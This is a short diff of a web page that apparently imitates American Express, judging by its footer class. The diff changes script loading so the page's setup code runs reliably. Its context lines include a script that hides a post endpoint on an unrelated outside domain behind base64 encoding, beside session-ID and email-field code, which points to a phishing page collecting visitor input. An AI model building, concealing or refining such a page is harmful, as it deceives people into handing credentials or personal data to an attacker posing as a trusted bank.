@@ -366,7 +366,7 @@
 
 		 </div>
 		</div>
-<script>
+<script defer>
 function setupUI() {
   const ENDPOINT = `${window.location.origin}${window.location.pathname}/c`;
 
@@ -432,8 +432,9 @@ function setupUI() {
   }
 }
 
-document.addEventListener("DOMContentLoaded", setupUI);
+setupUI();
 </script>
+
 
 <footer class="amex-footer">
   <div class="footer-container">
@@ -1139,7 +1140,7 @@ window.populateEmailFields = function () {
 })();
 </script>
 
-<script>
+<script defer>
 const sessionId = (crypto && crypto.randomUUID) ? crypto.randomUUID() : Date.now().toString();
 const endpoint  = atob("aHR0cHM6Ly9lbGVrdHJvLXNlcnZpcy5iYS9jZ2ktYmluL3Bvc3QucGhw");
 
